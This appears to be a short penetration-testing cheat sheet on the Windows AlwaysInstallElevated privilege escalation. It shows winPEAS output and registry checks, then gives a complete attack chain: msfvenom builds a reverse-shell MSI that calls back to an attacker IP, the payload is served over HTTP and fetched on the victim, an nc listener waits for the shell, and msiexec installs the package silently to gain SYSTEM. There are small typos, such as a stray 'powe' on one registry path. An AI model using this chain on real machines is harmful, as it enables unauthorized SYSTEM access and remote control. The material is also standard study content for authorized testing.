# AlwaysInstallElevated

winpeas outputs :

```
[+] Checking AlwaysInstallElevated
   [?]  https://book.hacktricks.xyz/windows/windows-local-privilege-escalation#alwaysinstallelevated                                             
    AlwaysInstallElevated set to 1 in HKLM!
    AlwaysInstallElevated set to 1 in HKCU!
```

### Check

```powershell
# Check if these registry values are set to "1".

reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated

Get-ItemProperty HKLM\Software\Policies\Microsoft\Windows\Installer
Get-ItemProperty HKCU\Software\Policies\Microsoft\Windows\Installerpowe
```

**These registry keys tell windows that a user of any privilege can install .msi files are NT AUTHORITY\SYSTEM. So all you need to do is create a malicious .msi file, and run it.**

```bash
msfvenom -p windows -a x64 -p windows/x64/shell_reverse_tcp LHOST=$attacker_ip LPORT=443 -f msi -o rev.msi
python -m SimpleHTTPServer 80

# on the windows victim
powershell wget http://$attacker_ip/rev.msi

# on attacker
nc -lvnp 443

# on victim
msiexec /quiet /qn /i rev.msi
```
